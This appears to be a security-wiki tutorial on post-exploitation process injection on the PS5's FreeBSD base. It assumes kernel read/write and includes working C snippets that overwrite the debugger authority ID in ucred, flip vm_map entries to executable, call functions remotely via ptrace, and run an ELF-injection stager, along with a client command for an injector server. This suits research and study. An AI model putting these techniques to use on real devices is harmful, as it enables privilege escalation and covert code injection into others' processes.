# FreeBSD ptrace RFI and vm_map PROT_EXEC bypass (PS5 case study)

{{#include ../../../banners/hacktricks-training.md}}

## Overview

This page documents a practical Unix/BSD usermode process/ELF injection technique on PlayStation 5 (PS5), which is based on FreeBSD. The method generalizes to FreeBSD derivatives when you already have kernel read/write (R/W) primitives. High level:

- Patch the current process credentials (ucred) to grant debugger authority, enabling ptrace/mdbg on arbitrary user processes.
- Find target processes by walking the kernel allproc list.
- Bypass PROT_EXEC restrictions by flipping vm_map_entry.protection |= PROT_EXEC in the target’s vm_map via kernel data writes.
- Use ptrace to perform Remote Function Invocation (RFI): suspend a thread, set registers to call arbitrary functions inside the target, resume, collect return values, and restore state.
- Map and run arbitrary ELF payloads inside the target using an in-process ELF loader, then spawn a dedicated thread that runs your payload and triggers a breakpoint to detach cleanly.

PS5 hypervisor mitigations worth noting (contextualized for this technique):
- XOM (execute-only .text) prevents reading/writing kernel .text.
- Clearing CR0.WP or disabling CR4.SMEP causes a hypervisor vmexit (crash). Only data-only kernel writes are viable.
- Userland mmap is restricted to PROT_READ|PROT_WRITE by default. Granting PROT_EXEC must be done by editing vm_map entries in kernel memory.

This technique is post-exploitation: it assumes kernel R/W primitives from an exploit chain. Public payloads demonstrate this up to firmware 10.01 at time of writing.

## Kernel data-only primitives

### Process discovery via allproc

FreeBSD maintains a doubly-linked list of processes in kernel .data at allproc. With a kernel read primitive, iterate it to locate process names and PIDs:

```c
struct proc* find_proc_by_name(const char* proc_name){
  uint64_t next = 0;
  kernel_copyout(KERNEL_ADDRESS_ALLPROC, &next, sizeof(uint64_t)); // list head
  struct proc* proc = malloc(sizeof(struct proc));
  do{
    kernel_copyout(next, (void*)proc, sizeof(struct proc));       // read entry
    if (!strcmp(proc->p_comm, proc_name)) return proc;
    kernel_copyout(next, &next, sizeof(uint64_t));                // advance next
  } while (next);
  free(proc);
  return NULL;
}

void list_all_proc_and_pid(){
  uint64_t next = 0;
  kernel_copyout(KERNEL_ADDRESS_ALLPROC, &next, sizeof(uint64_t));
  struct proc* proc = malloc(sizeof(struct proc));
  do{
    kernel_copyout(next, (void*)proc, sizeof(struct proc));
    printf("%s - %d\n", proc->p_comm, proc->pid);
    kernel_copyout(next, &next, sizeof(uint64_t));
  } while (next);
  free(proc);
}
```

Notes:
- KERNEL_ADDRESS_ALLPROC is firmware-dependent.
- p_comm is a fixed-size name; consider pid->proc lookups if needed.

### Elevate credentials for debugging (ucred)

On PS5, struct ucred includes an Authority ID field reachable via proc->p_ucred. Writing the debugger authority ID grants ptrace/mdbg over other processes:

```c
void set_ucred_to_debugger(){
  struct proc* proc = get_proc_by_pid(getpid());
  if (proc){
    uintptr_t authid = 0; // read current (optional)
    uintptr_t ptrace_authid = 0x4800000000010003ULL; // debugger Authority ID
    kernel_copyout((uintptr_t)proc->p_ucred + 0x58, &authid, sizeof(uintptr_t));
    kernel_copyin(&ptrace_authid, (uintptr_t)proc->p_ucred + 0x58, sizeof(uintptr_t));
    free(proc);
  }
}
```

- Offset 0x58 is specific to the PS5 firmware family and must be verified per version.
- After this write, the injector can attach and instrument user processes via ptrace/mdbg.

## Bypassing RW-only user mappings: vm_map PROT_EXEC flip

Userland mmap may be constrained to PROT_READ|PROT_WRITE. FreeBSD tracks a process’s address space in a vm_map of vm_map_entry nodes (BST plus list). Each entry carries protection and max_protection fields:

```c
struct vm_map_entry {
  struct vm_map_entry *prev,*next,*left,*right;
  vm_offset_t start, end, avail_ssize;
  vm_size_t adj_free, max_free;
  union vm_map_object object; vm_ooffset_t offset; vm_eflags_t eflags;
  vm_prot_t protection; vm_prot_t max_protection; vm_inherit_t inheritance;
  int wired_count; vm_pindex_t lastr;
};
```

With kernel R/W you can locate the target’s vm_map and set entry->protection |= PROT_EXEC (and, if needed, entry->max_protection). Practical implementation notes:
- Walk entries either linearly via next or using the balanced-tree (left/right) for O(log n) search by address range.
- Pick a known RW region you control (scratch buffer or mapped file) and add PROT_EXEC so you can stage code or loader thunks.
- PS5 SDK code provides helpers for fast map-entry lookup and toggling protections.

This bypasses userland’s mmap policy by editing kernel-owned metadata directly.

## Remote Function Invocation (RFI) with ptrace

FreeBSD lacks Windows-style VirtualAllocEx/CreateRemoteThread. Instead, drive the target to call functions on itself under ptrace control:

1. Attach to the target and select a thread; PTRACE_ATTACH or PS5-specific mdbg flows may apply.
2. Save thread context: registers, PC, SP, flags.
3. Write argument registers per the ABI (x86_64 SysV or arm64 AAPCS64), set PC to the target function, and optionally place additional args/stack as needed.
4. Single-step or continue until a controlled stop (e.g., software breakpoint or signal), then read back return values from regs.
5. Restore original context and continue.

Use cases:
- Call into an in-process ELF loader (e.g., elfldr_load) with a pointer to your ELF image in target memory.
- Invoke helper routines to fetch returned entrypoints and payload-args pointers.

Example of driving the ELF loader:

```c
intptr_t entry = elfldr_load(target_pid, (uint8_t*)elf_in_target);
intptr_t args  = elfldr_payload_args(target_pid);
printf("[+] ELF entrypoint: %#02lx\n[+] Payload Args: %#02lx\n", entry, args);
```

The loader maps segments, resolves imports, applies relocations and returns the entry (often a CRT bootstrap) plus an opaque payload_args pointer that your stager passes to the payload’s main().

## Threaded stager and clean detach

A minimal stager inside the target creates a new pthread that runs the ELF’s main and then triggers int3 to signal the injector to detach:

```c
int __attribute__((section(".stager_shellcode$1"))) stager(SCEFunctions* functions){
  pthread_t thread;
  functions->pthread_create_ptr(&thread, 0,
      (void*(*)(void*))functions->elf_main, functions->payload_args);
  asm("int3");
  return 0;
}
```

- The SCEFunctions/payload_args pointers are provided by the loader/SDK glue.
- After the breakpoint and detach, the payload continues in its own thread.

## End-to-end pipeline (PS5 reference implementation)

A working implementation ships as a small TCP injector server plus a client script:

- NineS server listens on TCP 9033 and receives a header containing the target process name followed by the ELF image:

```c
typedef struct __injector_data_t{
  char       proc_name[MAX_PROC_NAME];
  Elf64_Ehdr elf_header;
} injector_data_t;
```

- Python client usage:

```bash
python3 ./send_injection_elf.py SceShellUI hello_world.elf <PS5_IP>
```

Hello-world payload example (logs to klog):

```c
#include <stdio.h>
#include <unistd.h>
#include <ps5/klog.h>
int main(){
  klog_printf("Hello from PID %d\n", getpid());
  return 0;
}
```

## Practical considerations

- Offsets and constants (allproc, ucred authority offset, vm_map layout, ptrace/mdbg details) are firmware-specific and must be updated per release.
- Hypervisor protections force data-only kernel writes; do not attempt to patch CR0.WP or CR4.SMEP.
- JIT memory is an alternative: some processes expose PS5 JIT APIs to allocate executable pages. The vm_map protection flip removes the need to rely on JIT/mirroring tricks.
- Keep register save/restore robust; on failure, you can deadlock or crash the target.

## Public tooling

- PS5 SDK (dynamic linking, kernel R/W wrappers, vm_map helpers): https://github.com/ps5-payload-dev/sdk
- ELF loader: https://github.com/ps5-payload-dev/elfldr
- Injector server: https://github.com/buzzer-re/NineS/
- Utilities/vm_map helpers: https://github.com/buzzer-re/playstation_research_utils
- Related projects: https://github.com/OpenOrbis/mira-project, https://github.com/ps5-payload-dev/gdbsrv

## References

- [Usermode ELF injection on the PlayStation 5](https://reversing.codes/posts/PlayStation-5-ELF-Injection/)
- [ps5-payload-dev/sdk](https://github.com/ps5-payload-dev/sdk)
- [ps5-payload-dev/elfldr](https://github.com/ps5-payload-dev/elfldr)
- [buzzer-re/NineS](https://github.com/buzzer-re/NineS/)
- [playstation_research_utils](https://github.com/buzzer-re/playstation_research_utils)
- [Mira](https://github.com/OpenOrbis/mira-project)
- [gdbsrv](https://github.com/ps5-payload-dev/gdbsrv)
- [FreeBSD klog reference](https://lists.freebsd.org/pipermail/freebsd-questions/2006-October/134233.html)

{{#include ../../../banners/hacktricks-training.md}}